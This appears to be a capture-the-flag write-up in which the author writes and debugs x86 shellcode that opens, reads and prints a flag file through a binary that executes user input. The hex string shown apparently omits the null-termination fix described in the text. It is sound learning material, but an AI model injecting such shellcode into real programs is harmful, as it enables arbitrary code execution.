After opening the binary in IDA and looking at main, the following
section cought my eyes:

```assembly
push    offset aGiveMyYourShel ; "Give my your shellcode:"
call    _printf
add     esp, 10h
sub     esp, 4
push    0C8h
push    offset shellcode
push    0
call    _read
add     esp, 10h
mov     eax, offset shellcode
call    eax ; shellcode
```

The program reads 200 bytes from the user and executes them.
No need to find a vulnerability to exploit. Just to create
an appropriate shellcode to read the flag from /home/orw/flag.

This is what I came up with:

```assembly
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

push eax	; '/0'
push 0x67616C66	; galf
push 0x2F2F7772	; //wr
push 0x6F2F2F65	; o//e
push 0x6D6F682F	; moh/
mov al, 0x5	; sys_open
mov ebx, esp	; char* filename
int 0x80

mov ebx, eax 	; eax holds fd
xor eax, eax
mov al, 0x3	; sys_read
mov ecx, esp	; *buf
mov dl, 0x64	; count = 100 bytes
int 0x80

xor eax, eax
xor ebx, ebx
mov al, 0x4	; sys_write
mov bl, 0x1	; stdout
int 0x80
```

I converted the shellcode to hex using https://defuse.ca/online-x86-assembler.htm

```
"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x66\x6C\x61\x67\x68\x72\x77\x2F\x2F\x68\x65\x2F\x2F\x6F\x68\x2F\x68\x6F\x6D\xB0\x05\x89\xE3\xCD\x80\x89\xC3\x31\xC0\xB0\x03\x89\xE1\xB2\x64\xCD\x80\x31\xC0\x31\xDB\xB0\x04\xB3\x01\xCD\x80"
```

The fact that I'm writing my own shellcode teaches me concepts
that weren't straight forward before, such as the need to choose
the commands wisely to avoid null characters, otherwise it will
be prematurally terminated by the read function. This is the reason
for example to use mov al, 0x5 and not mov eax, 0x5.

To verify my shellcode locally, I used the following program:

```c
#include <stdio.h>
#include <string.h>
 
char shellcode[] = {
"\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x66\x6C\x61\x67\x68\x72\x77\x2F\x2F\x68\x65\x2F\x2F\x6F\x68\x2F\x68\x6F\x6D\xB0\x05\x89\xE3\xCD\x80\x89\xC3\x31\xC0\xB0\x03\x89\xE1\xB2\x64\xCD\x80\x31\xC0\x31\xDB\xB0\x04\xB3\x01\xCD\x80"
};
 
int main()
{
    printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
 
    return 0;
}
```

I compiled it using:
```
gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellode
```

For the above to work, I had to install gcc-multilib, since I'm on
a 64bit machine (sudo apt-get install gcc-multilib).

When I run the program I got a segmentation fault. Let's see why:
```
>strace ./shellcode
open("/home//orw//flag\t\2VV\1", O_RDONLY) = -1 ENOENT (No such file or directory)
```

I forgot to null-termiate the filename.
I've added 'push eax' before pushing the rest of the string.
The shellcode now works and I got the flag.